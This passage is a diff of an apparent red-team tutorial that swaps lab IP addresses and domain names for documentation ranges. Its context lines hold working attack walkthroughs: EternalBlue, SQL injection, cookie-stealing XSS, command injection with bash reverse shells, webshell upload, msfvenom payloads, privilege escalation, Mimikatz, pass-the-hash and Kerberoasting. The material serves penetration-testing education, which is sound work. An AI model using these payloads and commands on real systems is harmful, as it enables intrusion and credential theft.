@@ -15,7 +15,7 @@ tags: ["red-team", "intermediate", "by-example"]
 
 **What this covers:** EternalBlue exploits a critical SMB vulnerability (CVE-2017-0144) present in unpatched Windows systems. Metasploit automates the exploitation workflow from target selection through payload delivery. A successful run drops a Meterpreter shell on the target with SYSTEM privileges.
 
-**Scenario:** Authorized internal pentest; lab Windows 7 VM at 10.10.10.50 is unpatched and reachable on port 445.
+**Scenario:** Authorized internal pentest; lab Windows 7 VM at 192.0.2.50 is unpatched and reachable on port 445.
 
 ```msfconsole
 # Launch Metasploit console
@@ -25,10 +25,10 @@ msfconsole -q
 use exploit/windows/smb/ms17_010_eternalblue
 # => Selects the EternalBlue exploit module
 
-set RHOSTS 10.10.10.50
+set RHOSTS 192.0.2.50
 # => Sets the target host (lab Windows 7 VM)
 
-set LHOST 10.10.10.200
+set LHOST 192.0.2.200
 # => Sets the attacker's callback IP (local lab machine)
 
 set LPORT 4444
@@ -39,9 +39,9 @@ set PAYLOAD windows/x64/meterpreter/reverse_tcp
 
 run
 # => Sends the exploit; triggers SMB buffer overflow on target
-# => [*] Started reverse TCP handler on 10.10.10.200:4444
-# => [*] Sending stage (201798 bytes) to 10.10.10.50
-# => [*] Meterpreter session 1 opened (10.10.10.200:4444 -> 10.10.10.50:49158)
+# => [*] Started reverse TCP handler on 192.0.2.200:4444
+# => [*] Sending stage (201798 bytes) to 192.0.2.50
+# => [*] Meterpreter session 1 opened (192.0.2.200:4444 -> 192.0.2.50:49158)
 
 getuid
 # => Server username: NT AUTHORITY\SYSTEM
@@ -58,33 +58,33 @@ getuid
 
 **What this covers:** SQL injection occurs when user-supplied input is concatenated directly into a database query. The classic `' OR '1'='1` payload bypasses authentication by making the WHERE clause always true. UNION SELECT extends the attack to extract data from arbitrary tables.
 
-**Scenario:** CTF web challenge; target login form at `http://10.10.10.60/login`.
+**Scenario:** CTF web challenge; target login form at `http://192.0.2.60/login`.
 
 ```bash
 # Step 1 — Test for injection point with a single quote
-curl -s -X POST http://10.10.10.60/login \
+curl -s -X POST http://192.0.2.60/login \
   -d "username=admin'&password=test"
 # => Response: "You have an error in your SQL syntax"
 # => Confirms the username field is injectable (error-based)
 
 # Step 2 — Bypass authentication entirely
-curl -s -X POST http://10.10.10.60/login \
+curl -s -X POST http://192.0.2.60/login \
   -d "username=' OR '1'='1' --&password=irrelevant"
 # => Backend query becomes: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
 # => '1'='1' is always true; -- comments out the password check
 # => Response: "Welcome, admin!" (authentication bypassed)
 
 # Step 3 — Enumerate columns with ORDER BY
-curl -s -X POST http://10.10.10.60/login \
+curl -s -X POST http://192.0.2.60/login \
   -d "username=' ORDER BY 3 --&password=x"
 # => No error → table has at least 3 columns
 
-curl -s -X POST http://10.10.10.60/login \
+curl -s -X POST http://192.0.2.60/login \
   -d "username=' ORDER BY 4 --&password=x"
 # => Error: "Unknown column '4' in order clause" → exactly 3 columns
 
 # Step 4 — Extract data with UNION SELECT
-curl -s -X POST http://10.10.10.60/login \
+curl -s -X POST http://192.0.2.60/login \
   -d "username=' UNION SELECT username,password,3 FROM users --&password=x"
 # => Response body contains: admin | 5f4dcc3b5aa765d61d8327deb882cf99
 # => Second column is an MD5 hash; crack offline with hashcat
@@ -100,35 +100,35 @@ curl -s -X POST http://10.10.10.60/login \
 
 **What this covers:** Reflected Cross-Site Scripting injects a malicious script into a server's response through a URL parameter. When a victim clicks the crafted link, the browser executes the script in the context of the vulnerable site, allowing cookie theft and session hijacking.
 
-**Scenario:** Authorized web app pentest; target at `http://10.10.10.61/search?q=`.
+**Scenario:** Authorized web app pentest; target at `http://192.0.2.61/search?q=`.
 
 ```bash
 # Step 1 — Confirm reflection without encoding
-curl -s "http://10.10.10.61/search?q=hello"
+curl -s "http://192.0.2.61/search?q=hello"
 # => <h2>Results for: hello</h2>
 # => Input is reflected directly into the HTML — no encoding applied
 
 # Step 2 — Verify JavaScript execution
 # Craft a test payload (URL-encoded)
-curl -s "http://10.10.10.61/search?q=<script>alert(1)</script>"
+curl -s "http://192.0.2.61/search?q=<script>alert(1)</script>"
 # => <h2>Results for: <script>alert(1)</script></h2>
 # => Script tags pass through unescaped → XSS confirmed
 
 # Step 3 — Set up cookie receiver (attacker's server)
-# On attacker machine (10.10.10.200), start a simple listener
+# On attacker machine (192.0.2.200), start a simple listener
 python3 -m http.server 8080
 # => Serving HTTP on 0.0.0.0 port 8080
 
 # Step 4 — Build the cookie-stealing payload
 # Payload: document.cookie sent to attacker via Image src
-PAYLOAD='<script>new Image().src="http://10.10.10.200:8080/?c="+document.cookie</script>'
+PAYLOAD='<script>new Image().src="http://192.0.2.200:8080/?c="+document.cookie</script>'
 
 # URL-encode and embed in the search parameter
 python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))"
 # => %3Cscript%3Enew%20Image%28%29.src%3D%22http%3A%2F%2F10...
 
 # Step 5 — Craft and deliver the malicious link to victim
-# Victim clicks: http://10.10.10.61/search?q=%3Cscript%3Enew%20Image...
+# Victim clicks: http://192.0.2.61/search?q=%3Cscript%3Enew%20Image...
 # => Victim's browser executes the script
 # => Attacker's HTTP server receives:
 # => GET /?c=PHPSESSID=abc123def456;%20auth=eyJhbGciOi... HTTP/1.1
@@ -145,23 +145,23 @@ python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))"
 
 **What this covers:** Command injection occurs when user input is passed to a system shell command without sanitization. By appending shell metacharacters, an attacker runs arbitrary OS commands as the web server user. This is distinct from code injection and often leads to immediate remote code execution.
 
-**Scenario:** Authorized pentest; target web app at `http://10.10.10.62/ping` accepts an IP address and runs `ping` on the server.
+**Scenario:** Authorized pentest; target web app at `http://192.0.2.62/ping` accepts an IP address and runs `ping` on the server.
 
 ```bash
 # Step 1 — Observe normal behavior
-curl -s "http://10.10.10.62/ping?host=127.0.0.1"
+curl -s "http://192.0.2.62/ping?host=127.0.0.1"
 # => PING 127.0.0.1 (127.0.0.1) 56 data bytes
 # => 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms
 # => Normal ping output — server runs ping(8) with our input
 
 # Step 2 — Inject semicolon to chain a second command
-curl -s "http://10.10.10.62/ping?host=127.0.0.1;id"
+curl -s "http://192.0.2.62/ping?host=127.0.0.1;id"
 # => PING 127.0.0.1 ... (truncated)
 # => uid=33(www-data) gid=33(www-data) groups=33(www-data)
 # => id command executed; confirms injection as www-data
 
 # Step 3 — Read /etc/passwd to confirm arbitrary file access
-curl -s "http://10.10.10.62/ping?host=127.0.0.1;cat%20/etc/passwd"
+curl -s "http://192.0.2.62/ping?host=127.0.0.1;cat%20/etc/passwd"
 # => root:x:0:0:root:/root:/bin/bash
 # => daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 # => ... (full passwd file)
@@ -172,7 +172,7 @@ nc -lvnp 4444
 # => Listening on 0.0.0.0 4444
 
 # Inject a bash reverse shell (URL-encoded pipe and ampersand)
-curl -s "http://10.10.10.62/ping?host=127.0.0.1;bash%20-i%20>%26%20/dev/tcp/10.10.10.200/4444%200>%261"
+curl -s "http://192.0.2.62/ping?host=127.0.0.1;bash%20-i%20>%26%20/dev/tcp/192.0.2.200/4444%200>%261"
 # => Attacker's nc receives:
 # => bash: no job control in this shell
 # => www-data@lab-target:/var/www/html$
@@ -188,29 +188,29 @@ curl -s "http://10.10.10.62/ping?host=127.0.0.1;bash%20-i%20>%26%20/dev/tcp/10.1
 
 **What this covers:** Local File Inclusion (LFI) allows reading arbitrary files on the server by manipulating a file path parameter. Remote File Inclusion (RFI) fetches and executes a remote PHP script. LFI can escalate to RCE through log poisoning; RFI is direct code execution if `allow_url_include` is enabled.
 
-**Scenario:** Authorized pentest; target PHP app at `http://10.10.10.63/page.php?file=`.
+**Scenario:** Authorized pentest; target PHP app at `http://192.0.2.63/page.php?file=`.
 
 ```bash
 # Step 1 — Test LFI with a known file
-curl -s "http://10.10.10.63/page.php?file=../../../../etc/passwd"
+curl -s "http://192.0.2.63/page.php?file=../../../../etc/passwd"
 # => root:x:0:0:root:/root:/bin/bash
 # => bin:x:1:1:bin:/bin:/sbin/nologin
 # => Traversal successful — reading system files
 
 # Step 2 — Read SSH private key if present
-curl -s "http://10.10.10.63/page.php?file=../../../../root/.ssh/id_rsa"
+curl -s "http://192.0.2.63/page.php?file=../../../../root/.ssh/id_rsa"
 # => -----BEGIN RSA PRIVATE KEY-----
 # => MIIEowIBAAKCAQEA2a7...
 # => Key exfiltrated; use for direct SSH login
 
 # Step 3 — LFI log poisoning to achieve RCE
 # Poison the Apache access log via User-Agent
-curl -s -A '<?php system($_GET["cmd"]); ?>' http://10.10.10.63/
+curl -s -A '<?php system($_GET["cmd"]); ?>' http://192.0.2.63/
 # => Request logged to /var/log/apache2/access.log with PHP code as User-Agent
 
 # Include the log file to trigger code execution
-curl -s "http://10.10.10.63/page.php?file=../../../../var/log/apache2/access.log&cmd=id"
-# => 10.10.10.200 - - [21/May/2026] "GET / HTTP/1.1" 200 - uid=33(www-data)
+curl -s "http://192.0.2.63/page.php?file=../../../../var/log/apache2/access.log&cmd=id"
+# => 192.0.2.200 - - [21/May/2026] "GET / HTTP/1.1" 200 - uid=33(www-data)
 # => PHP executed — log poisoning RCE achieved
 
 # Step 4 — RFI (if allow_url_include=On)
@@ -219,7 +219,7 @@ echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
 python3 -m http.server 8080 --directory /tmp &
 # => Serving HTTP on 0.0.0.0 port 8080
 
-curl -s "http://10.10.10.63/page.php?file=http://10.10.10.200:8080/shell.php&c=whoami"
+curl -s "http://192.0.2.63/page.php?file=http://192.0.2.200:8080/shell.php&c=whoami"
 # => www-data
 # => Remote file fetched and executed as PHP
 ```
@@ -234,7 +234,7 @@ curl -s "http://10.10.10.63/page.php?file=http://10.10.10.200:8080/shell.php&c=w
 
 **What this covers:** Unrestricted file upload vulnerabilities allow uploading executable server-side scripts disguised as permitted file types. Bypassing client-side and server-side extension checks plants a webshell that provides persistent remote code execution as the web server user.
 
-**Scenario:** Authorized pentest; target app at `http://10.10.10.64/upload.php` accepts image uploads.
+**Scenario:** Authorized pentest; target app at `http://192.0.2.64/upload.php` accepts image uploads.
 
 ```bash
 # Step 1 — Create a minimal PHP webshell
@@ -242,26 +242,26 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 # => Creates a one-line PHP shell; ?cmd= parameter passes OS commands
 
 # Step 2 — Attempt direct upload (may be blocked by extension filter)
-curl -s -X POST http://10.10.10.64/upload.php \
+curl -s -X POST http://192.0.2.64/upload.php \
   -F "file=@shell.php;type=image/jpeg"
 # => Error: "Only image files are allowed"
 # => Server checks extension or MIME type
 
 # Step 3 — Bypass with double extension
 cp shell.php shell.php.jpg
-curl -s -X POST http://10.10.10.64/upload.php \
+curl -s -X POST http://192.0.2.64/upload.php \
   -F "file=@shell.php.jpg;type=image/jpeg"
 # => Success: "File uploaded to /uploads/shell.php.jpg"
 # => Apache may still execute .php if .php.jpg passes the PHP handler regex
 
 # Step 4 — Alternatively bypass with null-byte (older PHP/Apache)
 # Filename: shell.php%00.jpg — server strips after null byte
-curl -s -X POST http://10.10.10.64/upload.php \
+curl -s -X POST http://192.0.2.64/upload.php \
   --data-binary $'--boundary\r\nContent-Disposition: form-data; name="file"; filename="shell.php\x00.jpg"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--boundary--'
 # => Uploaded as shell.php on disk (null byte truncates filename)
 
 # Step 5 — Execute the webshell
-curl -s "http://10.10.10.64/uploads/shell.php.jpg?cmd=id"
+curl -s "http://192.0.2.64/uploads/shell.php.jpg?cmd=id"
 # => uid=33(www-data) gid=33(www-data) groups=33(www-data)
 # => Webshell active; attacker has RCE as www-data
 ```
@@ -276,31 +276,31 @@ curl -s "http://10.10.10.64/uploads/shell.php.jpg?cmd=id"
 
 **What this covers:** Many network devices, web applications, and services ship with well-known default credentials that administrators fail to change. Automated tools and curated wordlists make default credential discovery fast and systematic across an entire network subnet.
 
-**Scenario:** Authorized internal pentest; target network 10.10.10.0/24 with multiple web admin panels.
+**Scenario:** Authorized internal pentest; target network 192.0.2.0/24 with multiple web admin panels.
 
 ```bash
 # Step 1 — Identify web services with open admin panels
-nmap -p 80,443,8080,8443,9090,9200 10.10.10.0/24 --open -oG web_hosts.txt
-# => 10.10.10.65:80 open
-# => 10.10.10.66:8080 open (title: "Jenkins")
-# => 10.10.10.67:9090 open (title: "Grafana")
+nmap -p 80,443,8080,8443,9090,9200 192.0.2.0/24 --open -oG web_hosts.txt
+# => 192.0.2.65:80 open
+# => 192.0.2.66:8080 open (title: "Jenkins")
+# => 192.0.2.67:9090 open (title: "Grafana")
 
 # Step 2 — Try default credentials against Jenkins (admin:admin)
-curl -s -u admin:admin http://10.10.10.66:8080/api/json
+curl -s -u admin:admin http://192.0.2.66:8080/api/json
 # => {"_class":"hudson.model.Hudson","assignedLabels":[...]}
 # => 200 OK — admin:admin works on Jenkins instance
 
 # Step 3 — Use hydra to spray common defaults against HTTP form
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-  10.10.10.65 http-post-form \
+  192.0.2.65 http-post-form \
   "/admin/login:username=^USER^&password=^PASS^:Invalid credentials" \
   -t 4 -f
-# => [80][http-post-form] host: 10.10.10.65   login: admin   password: admin123
+# => [80][http-post-form] host: 192.0.2.65   login: admin   password: admin123
 # => -f flag stops after first success; credentials found
 
 # Step 4 — Exploit Jenkins script console for RCE
 curl -s -u admin:admin \
-  "http://10.10.10.66:8080/scriptConsole" \
+  "http://192.0.2.66:8080/scriptConsole" \
   -d 'script=println("id".execute().text)' \
   --data-urlencode 'json={}'
 # => uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
@@ -361,12 +361,12 @@ hashcat -m 1000 ntlm_only.txt -a 3 ?a?a?a?a?a?a?a?a
 
 **What this covers:** msfvenom is the Metasploit payload generator that creates standalone executable payloads in dozens of formats. An ELF reverse shell binary for Linux connects back to the attacker's listener when executed on the target, establishing a Meterpreter or raw shell session.
 
-**Scenario:** Authorized pentest; attacker has a file upload or file write primitive on a Linux target at 10.10.10.68.
+**Scenario:** Authorized pentest; attacker has a file upload or file write primitive on a Linux target at 192.0.2.68.
 
 ```bash
 # Step 1 — Generate a staged Meterpreter ELF payload
 msfvenom -p linux/x64/meterpreter/reverse_tcp \
-  LHOST=10.10.10.200 \
+  LHOST=192.0.2.200 \
   LPORT=4444 \
   -f elf \
   -o shell.elf
@@ -377,7 +377,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp \
 
 # Step 2 — Generate a stageless (self-contained) payload for reliability
 msfvenom -p linux/x64/shell_reverse_tcp \
-  LHOST=10.10.10.200 \
+  LHOST=192.0.2.200 \
   LPORT=4445 \
   -f elf \
   -o shell_stageless.elf
@@ -387,14 +387,14 @@ msfvenom -p linux/x64/shell_reverse_tcp \
 # Step 3 — Deliver the payload to the target
 # Via HTTP if web upload is available
 python3 -m http.server 8080 &
-# => Payload served at http://10.10.10.200:8080/shell.elf
+# => Payload served at http://192.0.2.200:8080/shell.elf
 
 # On target (via command injection or existing shell access):
-# wget http://10.10.10.200:8080/shell.elf -O /tmp/shell.elf
+# wget http://192.0.2.200:8080/shell.elf -O /tmp/shell.elf
 # chmod +x /tmp/shell.elf
 
 # Step 4 — Start Metasploit listener before executing payload
-msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.200; set LPORT 4444; run"
+msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 192.0.2.200; set LPORT 4444; run"
 # => Handler waits for incoming connection
 # => [*] Meterpreter session 1 opened after target executes shell.elf
 ```
@@ -409,7 +409,7 @@ msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_t
 
 **What this covers:** Netcat is the simplest tool for catching raw reverse shell connections. It requires no framework and works whenever a target machine executes a shell one-liner that connects back on TCP. Understanding raw shell interaction is foundational before moving to more capable handlers.
 
-**Scenario:** Authorized pentest; target Linux server at 10.10.10.69 is vulnerable to command injection; attacker controls 10.10.10.200.
+**Scenario:** Authorized pentest; target Linux server at 192.0.2.69 is vulnerable to command injection; attacker controls 192.0.2.200.
 
 ```bash
 # Step 1 — Start the netcat listener on attacker machine
@@ -422,14 +422,14 @@ nc -lvnp 4444
 
 # Step 2 — Trigger the reverse shell on the target
 # (Executed via command injection, cron, or existing partial access)
-# Target runs: bash -i >& /dev/tcp/10.10.10.200/4444 0>&1
+# Target runs: bash -i >& /dev/tcp/192.0.2.200/4444 0>&1
 # => bash -i opens an interactive bash session
 # => >& redirects stdout and stderr to the TCP socket
 # => /dev/tcp is a bash built-in TCP pseudo-device
 # => 0>&1 redirects stdin from the socket too
 
 # Step 3 — Netcat receives the connection
-# => connect to 10.10.10.69 from 10.10.10.69:52341
+# => connect to 192.0.2.69 from 192.0.2.69:52341
 # => bash: no job control in this shell
 # => www-data@lab-target:/var/www/html$
 
@@ -458,7 +458,7 @@ cat /etc/os-release
 
 **What this covers:** Raw reverse shells are fragile — Ctrl+C kills them, arrow keys produce garbled escape sequences, and tab completion is absent. The standard stabilization technique upgrades the raw socket to a proper pseudoterminal (PTY) using Python's pty module, then configures the terminal dimensions.
 
-**Scenario:** Continuing from Example 38; attacker has a raw netcat reverse shell as www-data on 10.10.10.69.
+**Scenario:** Continuing from Example 38; attacker has a raw netcat reverse shell as www-data on 192.0.2.69.
 
 ```bash
 # --- On the target machine (inside the raw shell) ---
@@ -513,7 +513,7 @@ ls --color=auto
 
 **What this covers:** SUID (Set User ID) binaries run with the file owner's privileges regardless of who executes them. When a SUID binary owned by root can be exploited to spawn a shell or read arbitrary files, a low-privileged user can escalate to root. GTFOBins documents exploitation patterns for hundreds of standard Unix binaries.
 
-**Scenario:** Authorized pentest; shell as www-data on lab Linux VM 10.10.10.70; attempting local privilege escalation.
+**Scenario:** Authorized pentest; shell as www-data on lab Linux VM 192.0.2.70; attempting local privilege escalation.
 
 ```bash
 # Step 1 — Find all SUID binaries on the system
@@ -612,7 +612,7 @@ cat /etc/shadow
 
 **What this covers:** Cron jobs running as root that call scripts in world-writable directories allow a low-privileged user to replace or modify the script. When cron executes the modified script, arbitrary commands run as root. This is a common finding in misconfigured Linux servers.
 
-**Scenario:** Authorized pentest; shell as `lowuser` on lab Linux VM 10.10.10.72.
+**Scenario:** Authorized pentest; shell as `lowuser` on lab Linux VM 192.0.2.72.
 
 ```bash
 # Step 1 — Enumerate cron jobs for all users
@@ -717,7 +717,7 @@ whoami
 
 **What this covers:** Kernel vulnerabilities allow privilege escalation from any user context regardless of application-layer controls. linux-exploit-suggester analyzes kernel version and installed patches to recommend applicable public kernel exploits, reducing research time significantly.
 
-**Scenario:** Authorized pentest; shell as `lowuser` on lab Ubuntu 18.04 VM 10.10.10.74; no obvious misconfigs found.
+**Scenario:** Authorized pentest; shell as `lowuser` on lab Ubuntu 18.04 VM 192.0.2.74; no obvious misconfigs found.
 
 ```bash
 # Step 1 — Check kernel version
@@ -733,10 +733,10 @@ cat /etc/os-release
 # On attacker machine:
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
 python3 -m http.server 8080 &
-# => Serves LES script at http://10.10.10.200:8080/les.sh
+# => Serves LES script at http://192.0.2.200:8080/les.sh
 
 # On target:
-wget http://10.10.10.200:8080/les.sh -O /tmp/les.sh
+wget http://192.0.2.200:8080/les.sh -O /tmp/les.sh
 chmod +x /tmp/les.sh
 
 # Step 3 — Run the exploit suggester
@@ -754,7 +754,7 @@ chmod +x /tmp/les.sh
 
 # Step 4 — Compile and run a suggested kernel exploit (lab context)
 # Download CVE-2019-13272 PoC
-wget http://10.10.10.200:8080/ptrace_traceme.c -O /tmp/ptrace_traceme.c
+wget http://192.0.2.200:8080/ptrace_traceme.c -O /tmp/ptrace_traceme.c
 gcc /tmp/ptrace_traceme.c -o /tmp/ptrace_exploit
 # => Compiles the exploit on target (gcc must be available)
 
@@ -775,7 +775,7 @@ gcc /tmp/ptrace_traceme.c -o /tmp/ptrace_exploit
 
 **What this covers:** Windows service binary paths containing spaces must be quoted. If unquoted, the Service Control Manager attempts to execute partial path segments as executables. An attacker with write access to an intermediate directory can plant a malicious binary that Windows runs as SYSTEM when the service starts.
 
-**Scenario:** Authorized pentest; shell as a low-privileged user on lab Windows Server 2016 at 10.10.10.75.
+**Scenario:** Authorized pentest; shell as a low-privileged user on lab Windows Server 2016 at 192.0.2.75.
 
 ```powershell
 # Step 1 — Find services with unquoted paths containing spaces
@@ -804,7 +804,7 @@ icacls "C:\Program Files\Vuln Application"
 # => Users have write permission — we can plant a file here!
 
 # Step 4 — Generate a malicious binary (on attacker Linux machine)
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.200 LPORT=4445 -f exe -o Vuln.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.200 LPORT=4445 -f exe -o Vuln.exe
 # => Creates Vuln.exe reverse shell payload
 # => Name matches the partial path Windows tries: C:\Program Files\Vuln.exe
 
@@ -827,13 +827,13 @@ sc start VulnService
 
 **What this covers:** If a low-privileged user has SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG permissions on a Windows service, they can modify the service's binary path to a malicious executable. The service then runs the attacker's code as SYSTEM when started or restarted.
 
-**Scenario:** Authorized pentest; low-privileged user shell on lab Windows 10 VM 10.10.10.76.
+**Scenario:** Authorized pentest; low-privileged user shell on lab Windows 10 VM 192.0.2.76.
 
 ```cmd
 :: Step 1 — Transfer accesschk to target (Sysinternals tool)
 :: On attacker: host accesschk64.exe via HTTP
 :: On target:
-certutil -urlcache -split -f http://10.10.10.200:8080/accesschk64.exe C:\Temp\accesschk64.exe
+certutil -urlcache -split -f http://192.0.2.200:8080/accesschk64.exe C:\Temp\accesschk64.exe
 :: => Downloads accesschk64.exe using built-in certutil (LOLBin)
 
 :: Step 2 — Check service permissions for the current user
@@ -880,7 +880,7 @@ net stop SSDPSRV && net start SSDPSRV
 
 **What this covers:** Mimikatz reads credentials from LSASS (Local Security Authority Subsystem Service) process memory on Windows. The `sekurlsa::logonpasswords` command extracts plaintext passwords, NTLM hashes, and Kerberos tickets for all interactive logon sessions cached in memory.
 
-**Scenario:** Authorized pentest; SYSTEM-level shell on lab Windows Server 2016 at 10.10.10.77; credential harvesting phase.
+**Scenario:** Authorized pentest; SYSTEM-level shell on lab Windows Server 2016 at 192.0.2.77; credential harvesting phase.
 
 ```cmd
 :: Step 1 — Launch Mimikatz (requires SYSTEM or SeDebugPrivilege)
@@ -938,39 +938,39 @@ sekurlsa::msv
 
 **What this covers:** NTLM authentication allows authentication using only the password hash — the plaintext is never needed. Pass-the-hash attacks use a captured NTLM hash directly to authenticate to remote SMB, WMI, or other Windows services, enabling lateral movement without cracking the password.
 
-**Scenario:** Authorized pentest; NTLM hash for Administrator obtained from Mimikatz on 10.10.10.77; targeting another lab Windows host at 10.10.10.78.
+**Scenario:** Authorized pentest; NTLM hash for Administrator obtained from Mimikatz on 192.0.2.77; targeting another lab Windows host at 192.0.2.78.
 
 ```bash
 # Attacker is on a Linux machine with pth-suite and impacket installed
 
 # Step 1 — Verify SMB is accessible on target
-nmap -p 445 10.10.10.78
+nmap -p 445 192.0.2.78
 # => 445/tcp open microsoft-ds
 # => SMB reachable — pass-the-hash viable
 
 # Step 2 — Use pth-winexe to execute a command via pass-the-hash
-pth-winexe -U 'LAB-TARGET/Administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' //10.10.10.78 whoami
+pth-winexe -U 'LAB-TARGET/Administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' //192.0.2.78 whoami
 # => -U specifies user in format DOMAIN/User%LMhash:NTLMhash
 # => aad3b435... is the blank LM hash (LM disabled, placeholder required)
 # => 8846f7eaee... is the captured NTLM hash for Administrator
 # => nt authority\system
-# => Command executed on 10.10.10.78 as SYSTEM via SMB
+# => Command executed on 192.0.2.78 as SYSTEM via SMB
 
 # Step 3 — Get an interactive shell via pass-the-hash
-pth-winexe -U 'LAB-TARGET/Administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' //10.10.10.78 cmd.exe
+pth-winexe -U 'LAB-TARGET/Administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' //192.0.2.78 cmd.exe
 # => Microsoft Windows [Version 10.0.14393]
-# => C:\Windows\system32> (interactive CMD shell on 10.10.10.78)
+# => C:\Windows\system32> (interactive CMD shell on 192.0.2.78)
 
 # Step 4 — Alternatively use impacket's psexec.py for PTH
 python3 /usr/share/doc/python3-impacket/examples/psexec.py \
   -hashes 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' \
-  Administrator@10.10.10.78
+  Administrator@192.0.2.78
 # => Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-# => [*] Requesting shares on 10.10.10.78
+# => [*] Requesting shares on 192.0.2.78
 # => [*] Found writable share ADMIN$
 # => [*] Uploading file aBcDeFgH.exe (service binary)
-# => [*] Opening SVCManager on 10.10.10.78
-# => [*] Creating service aBcD on 10.10.10.78
+# => [*] Opening SVCManager on 192.0.2.78
+# => [*] Creating service aBcD on 192.0.2.78
 # => [*] Starting service aBcD.....
 # => Microsoft Windows [Version 10.0.14393]
 # => C:\Windows\system32>
@@ -986,31 +986,31 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py \
 
 **What this covers:** Kerberoasting targets Active Directory service accounts with Service Principal Names (SPNs). Any authenticated domain user can request Kerberos service tickets (TGS) for SPN-registered accounts. The tickets are encrypted with the service account's NTLM hash and can be cracked offline to recover the plaintext password.
 
-**Scenario:** Authorized pentest; domain user shell on lab Windows domain `lab.local`; targeting service accounts.
+**Scenario:** Authorized pentest; domain user shell on lab Windows domain `lab.example`; targeting service accounts.
 
 ```bash
 # Attacker on Linux with impacket installed; valid domain credentials obtained
 
 # Step 1 — Request TGS tickets for all SPN-registered accounts
 python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
-  lab.local/jdoe:Password123 \
-  -dc-ip 10.10.10.10 \
+  lab.example/jdoe:Password123 \
+  -dc-ip 192.0.2.10 \
   -request
-# => lab.local/jdoe:Password123 — valid domain user credentials
-# => -dc-ip — points to the domain controller at 10.10.10.10
+# => lab.example/jdoe:Password123 — valid domain user credentials
+# => -dc-ip — points to the domain controller at 192.0.2.10
 # => -request — download TGS tickets in addition to listing SPNs
 # =>
 # => ServicePrincipalName              Name        MemberOf   PasswordLastSet
 # => ---------------------------------  ----------  ---------  ----------------------
-# => HTTP/webserver.lab.local          websvc      -          2026-01-15 09:23:41
-# => MSSQLSvc/dbserver.lab.local:1433  sqlservice  -          2025-11-02 14:55:12
+# => HTTP/webserver.lab.example          websvc      -          2026-01-15 09:23:41
+# => MSSQLSvc/dbserver.lab.example:1433  sqlservice  -          2025-11-02 14:55:12
 # =>
-# => $krb5tgs$23$*websvc$LAB.LOCAL$HTTP/webserver.lab.local*$1a2b3c4d5e6f...
-# => $krb5tgs$23$*sqlservice$LAB.LOCAL$MSSQLSvc/dbserver.lab.local:1433*$9f8e7d6c...
+# => $krb5tgs$23$*websvc$LAB.EXAMPLE$HTTP/webserver.lab.example*$1a2b3c4d5e6f...
+# => $krb5tgs$23$*sqlservice$LAB.EXAMPLE$MSSQLSvc/dbserver.lab.example:1433*$9f8e7d6c...
 # => Hashes saved; etype 23 = RC4 encryption (crackable)
 
 # Step 2 — Save hashes to a file
-python3 GetUserSPNs.py lab.local/jdoe:Password123 -dc-ip 10.10.10.10 -request -outputfile tgs_hashes.txt
+python3 GetUserSPNs.py lab.example/jdoe:Password123 -dc-ip 192.0.2.10 -request -outputfile tgs_hashes.txt
 # => Hashes written to tgs_hashes.txt (one per line)
 
 # Step 3 — Crack TGS hashes with hashcat
@@ -1022,7 +1022,7 @@ hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/h
 # => Hash cracked — sqlservice password is ServicePass2024!
 
 # Step 4 — Use cracked credentials for further access
-python3 psexec.py lab.local/sqlservice:'ServicePass2024!'@10.10.10.20
+python3 psexec.py lab.example/sqlservice:'ServicePass2024!'@192.0.2.20
 # => Authenticates to DB server with recovered credentials
 # => Opens interactive SYSTEM shell on the database server
 ```
@@ -1037,27 +1037,27 @@ python3 psexec.py lab.local/sqlservice:'ServicePass2024!'@10.10.10.20
 
 **What this covers:** Kerberos pre-authentication is a security feature that requires users to prove identity before receiving a TGT. When an account has pre-auth disabled (`DONT_REQUIRE_PREAUTH` flag), anyone can request an AS-REP response containing data encrypted with that account's hash — crackable offline without any valid credentials.
 
-**Scenario:** Authorized pentest; no domain credentials yet; targeting lab domain `lab.local` from 10.10.10.200.
+**Scenario:** Authorized pentest; no domain credentials yet; targeting lab domain `lab.example` from 192.0.2.200.
 
 ```bash
 # Step 1 — Enumerate accounts with pre-auth disabled (no credentials needed!)
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
-  lab.local/ \
+  lab.example/ \
   -usersfile /usr/share/wordlists/usernames.txt \
   -format hashcat \
   -outputfile asrep_hashes.txt \
-  -dc-ip 10.10.10.10
-# => lab.local/ — no credentials (unauthenticated request)
+  -dc-ip 192.0.2.10
+# => lab.example/ — no credentials (unauthenticated request)
 # => -usersfile — list of usernames to test
 # => -format hashcat — output in hashcat-compatible format
 # =>
-# => [-] lab.local/administrator - Client not found in Kerberos database
